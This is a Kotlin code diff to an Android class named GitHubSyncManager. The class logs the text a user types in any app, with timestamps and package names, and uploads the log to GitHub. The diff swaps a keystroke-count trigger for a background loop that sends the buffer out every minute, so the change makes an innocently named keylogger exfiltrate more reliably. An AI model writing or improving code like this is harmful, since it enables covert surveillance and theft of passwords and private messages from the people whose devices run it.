@@ -4,6 +4,7 @@ import android.util.Base64
 import android.util.Log
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import org.json.JSONObject
 import java.net.HttpURLConnection
@@ -16,20 +17,31 @@ class GitHubSyncManager {
     companion object {
         private const val TAG = "GitHubSyncManager"
         private val buffer = StringBuilder()
-        private const val BATCH_THRESHOLD = 20 // Sync to GitHub every 20 keystrokes
         private val scope = CoroutineScope(Dispatchers.IO)
+        private var lastAppName = "unknown.app"
+
+        init {
+            startPeriodicSync()
+        }
+
+        private fun startPeriodicSync() {
+            scope.launch {
+                while (true) {
+                    delay(60_000L) // 1 minute interval
+                    flushBufferToGitHub(lastAppName)
+                }
+            }
+        }
 
         fun logKeystroke(text: String, packageName: String?) {
             scope.launch {
                 val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                 val appName = packageName ?: "unknown.app"
+                lastAppName = appName
                 val logEntry = "[$timeStr] App: $appName | Typed: $text\n"
                 
                 synchronized(buffer) {
                     buffer.append(logEntry)
-                    if (buffer.length >= BATCH_THRESHOLD * 50) {
-                        flushBufferToGitHub(appName)
-                    }
                 }
             }
         }
